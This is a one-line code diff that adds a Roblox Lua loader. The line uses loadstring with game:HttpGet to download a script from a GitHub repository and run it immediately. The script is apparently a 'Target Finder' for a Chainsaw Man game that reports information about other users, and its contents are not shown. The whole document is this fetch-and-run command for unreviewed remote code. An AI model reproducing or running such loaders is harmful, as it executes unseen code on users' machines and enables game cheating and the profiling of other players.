@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JYTheTrue/RB-Scripts/main/Chainsaw%20Man/Roblox%20Target%20Finder%20F9%20for%20infos%20about%20users.txt"))()
